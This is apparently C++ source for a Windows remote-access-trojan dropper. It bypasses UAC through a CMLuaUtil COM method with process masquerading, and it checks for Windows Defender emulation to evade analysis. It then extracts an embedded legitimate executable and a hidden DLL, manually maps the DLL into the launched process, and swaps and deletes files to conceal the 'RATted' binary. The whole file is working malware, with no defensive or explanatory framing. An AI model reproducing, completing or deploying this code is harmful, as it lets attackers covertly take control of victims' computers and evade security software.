#include "injection.h"
#include "utils.h"
#include "embeds.h"

#include <windows.h>
#include <string>
#include <iostream>
#include <WinUser.h>

#define OEMRESOURCE
#pragma comment(lib, "comctl32.lib")

extern "C" {
    #include "Shared/windefend.h"
    #include "global.h"
    #include "ntstatus.h"
}

//#define _DEBUG

NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide = TRUE);

#define JOIN(x, y) x ## y
#ifdef _WIN64
#define FULL_PATH(x) JOIN("C:\\Windows\\System32\\", x)
#else
#define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
#endif

#define     MY_DLL      "windows32.dll"
#define     MY_TARGET   "update.exe"

//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    //Alloc console for debugging purposes since the manual mapper can't be compiled in debug
#ifdef _DEBUG
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
#endif
	//Must be called before calling UAC bypass due to it manipulating/faking executable information
	auto cwd = GetCWD();
    auto target = (cwd + std::string(MY_TARGET)); //Full path to the target executable

    if (!Utils::IsElevated()) {
        StartProcessAsAdmin((LPWSTR)ExePathW(), FALSE);
        return 0;
    }

    //Extracts the legit image and dll to execute from its own image and starts it (inherits administrator permission from parent process)
    Utils::ExtractImageToDisk(embedded_image_1, embedded_image_1_size, target); //First embedded image should be the legit executable
    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, cwd + MY_DLL);
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    while (!CreateProcessA(target.c_str(), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
    {
        Sleep(100);
    }
    CloseHandle(processInfo.hThread);

    //Open handle to legit process
	HANDLE hProc = processInfo.hProcess;
	//while (!hProc) {
    //    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(MY_TARGET));
    //    if (!hProc) { 
    //        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess(ExeModuleName().c_str()));
    //    }
    //    Sleep(1000);
	//}
	//Manual map my DLL inside target process and call DllMain
	auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
	while (!pMyDll) {
        pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
        Sleep(1000);
	}
	CloseHandle(hProc);

    auto full_path = ExePathA();
    while (rename(full_path , (GetCWD() + "trash.tmp").c_str()) != 0) {
        Sleep(100);
    }

    while (rename(target.c_str(), full_path)) { //Rename update.exe to this file's original name to let Dll know it can delete the RATted version from disk
        Sleep(100);
    }

    //Remove my dll from disk just in case idk
    remove((cwd + MY_DLL).c_str());

	return 0;
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD* RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    UCM_METHOD  Method;
    NTSTATUS    Result = STATUS_SUCCESS;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];


    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        Method = *RunMethod;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }
#endif

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
            optionalParameter,
            optionalParameterLength,
            supEncodePointer(DecompressPayload),
            OutputToDebugger);


    } while (FALSE);

    if (g_ctx == NULL)
        Result = STATUS_FATAL_APP_EXIT;

    return Result;
}

NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide) {

    NTSTATUS    Status;
    UCM_METHOD  method = UacMethodCMLuaUtil;

    wdCheckEmulatedVFS();

    Status = ucmInit(&method,
        NULL,
        0,
        FALSE);

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);
    PUCM_API_DISPATCH_ENTRY Entry;

    UCM_PARAMS_BLOCK ParamsBlock;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    ucmCMLuaUtilShellExecMethod(lpName, bHide);
}